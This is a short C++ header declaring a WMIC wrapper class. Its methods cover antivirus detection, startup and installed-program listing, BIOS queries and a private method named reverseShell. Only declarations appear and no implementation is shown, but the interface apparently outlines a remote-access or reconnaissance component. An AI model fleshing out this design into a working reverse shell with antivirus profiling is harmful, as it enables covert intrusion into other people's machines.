#pragma once
#include <iostream>
#include <vector>

using namespace std;

class WMIC {
private:
	string _executeWMIC(string command);
	std::string reverseShell(std::string cmd);
public:
	void test();

	string getAntivirusInfo();

	string getStartProgram();

	string getInstalledProgram(bool version = false);
	string getProgramVersionByPath(string path);
	string getBIOSInfo();
};